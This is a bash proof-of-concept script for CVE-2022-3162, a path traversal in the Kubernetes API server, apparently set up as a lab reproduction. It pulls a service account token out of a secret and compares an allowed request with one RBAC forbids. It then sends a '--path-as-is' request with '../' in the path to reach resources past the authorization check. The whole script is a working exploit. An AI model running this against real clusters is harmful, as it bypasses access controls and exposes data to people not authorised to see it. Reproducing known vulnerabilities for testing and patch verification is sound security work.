#!/usr/bin/env bash
set -euo pipefail

NS=cve-2022-3162

SECRET_NAME=$(kubectl -n "$NS" get sa poc -o jsonpath='{.secrets[0].name}')
TOKEN=$(kubectl -n "$NS" get secret "$SECRET_NAME" -o jsonpath='{.data.token}' | base64 -d)

# For generic evaluation, we assume API_SERVER is the current cluster endpoint.
API_SERVER=$(kubectl config view -o jsonpath='{.clusters[0].cluster.server}')

echo "[*] Using token: ${TOKEN:0:20}..."
echo "[*] API_SERVER: $API_SERVER"

echo
echo "[*] Normal access to typeones (allowed):"
curl -sk -H "Authorization: Bearer $TOKEN" \
  "${API_SERVER}/apis/example.com/v1/typeones" | jq '.kind,.items[].metadata.name' || true

echo
echo "[*] Direct access to typetwos (should be forbidden by RBAC):"
curl -sk -H "Authorization: Bearer $TOKEN" \
  "${API_SERVER}/apis/example.com/v1/typetwos" | jq '.kind,.items[].metadata.name' || true

echo
echo "[*] Path traversal access (CVE-2022-3162 pattern):"
curl -sk -H "Authorization: Bearer $TOKEN" --path-as-is \
  "${API_SERVER}/apis/example.com/v1/namespaces/../typeones" | jq '.kind,.items[].metadata.name' || true

